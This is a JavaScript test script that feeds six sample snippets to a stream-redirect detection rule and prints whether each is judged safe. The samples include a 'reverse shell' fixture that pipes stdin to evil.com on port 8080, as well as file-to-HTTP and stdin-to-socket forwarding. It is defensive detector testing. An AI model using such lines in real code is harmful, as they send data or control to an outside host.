const rule27 = require("../services/rule27.stream_redirect");

const samples = [
  {
    name: "1)Benign logging",
    code: `
      console.log("hello world");
    `
  },
  {
  name: "2)Simple HTTP request (no streams)",
  code: `
    const http = require("http");
    http.request({ host: "example.com", path: "/" });
  `
},
  {
    name: "3)File upload over HTTP",
    code: `
      const fs = require("fs");
      const http = require("http");
      fs.createReadStream("file.txt").pipe(http.request({}));
    `
  },
  {
    name: "4)Reverse shell via stdin",
    code: `
      const net = require("net");
      process.stdin.pipe(net.connect(8080, "evil.com"));
    `
  },
  {
    name: "5)Data listener forwarding",
    code: `
      const net = require("net");
      process.stdin.on("data", d => {
        socket.write(d);
      });
    `
  },
  {
  name: "6)Local file read only",
  code: `
    const fs = require("fs");
    fs.createReadStream("file.txt");
  `
}

];

samples.forEach(s => {
  const findings = rule27.run({ sourceCode: s.code });
  const safe = findings.every(f => f.severity !== "HIGH");

  console.log(`${s.name} → safe: ${safe}`);

  if (findings.length) {
    console.log("  findings:", findings);
  }
});
